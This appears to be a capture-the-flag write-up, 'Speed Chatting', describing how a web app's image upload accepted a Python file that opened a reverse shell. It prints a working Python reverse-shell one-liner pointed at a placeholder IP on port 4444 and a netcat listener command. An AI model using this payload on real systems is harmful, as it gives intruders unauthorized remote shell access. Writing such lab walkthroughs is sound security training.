# Speed Chatting

# **Speed Chatting**

## **Objective**

Gain access to the target system by exploiting the image upload functionality and retrieve the flag.

## **Methodology**

### **1. Initial Reconnaissance**

- Inspected the source code of the web page to understand its structure and identify potential attack vectors.
- Noted that the application includes an image upload feature, which is often a point of exploitation.

### **2. Exploiting File Upload**

- Attempted to upload a malicious file instead of a legitimate image.
- Crafted a Python reverse shell script to establish a connection back to my machine.

### **3. Reverse Shell Payload**

Created `shell.py` with the following one-liner:

python

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

*Note: Replace `"ip"` with your actual IP address.*

### **4. Listener Setup**

- Started a Netcat listener on port 4444 to catch the incoming reverse shell:
    
    bash
    
    ```
    nc -lvnp 4444
    ```
    

### **5. Upload and Execution**

- Uploaded `shell.py` through the image upload functionality.
- After a short delay, the shell connected back to my listener, granting interactive access to the target system.

### **6. Flag Retrieval**

- Navigated the file system and located `flag.txt`.
- Displayed the contents to obtain the flag.